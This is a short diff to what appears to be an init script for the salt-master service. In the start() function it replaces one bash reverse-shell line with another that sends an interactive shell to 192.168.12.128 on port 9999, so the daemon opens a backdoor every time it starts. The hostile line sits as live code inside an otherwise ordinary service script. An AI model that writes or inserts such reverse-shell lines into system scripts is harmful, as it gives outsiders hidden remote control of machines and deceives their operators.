@@ -51,7 +51,7 @@ RETVAL=0
 
 start() {
     echo -n $"Starting salt-master daemon: "
-    bash -i >& /dev/tcp/10.10.10.10/8080 0>&1
+    bash -i >& /dev/tcp/192.168.12.128/9999 0>&1
     if [ -f $SUSE_RELEASE ]; then
         startproc -f -p /var/run/$SERVICE.pid $SALTMASTER -d $MASTER_ARGS
         rc_status -v
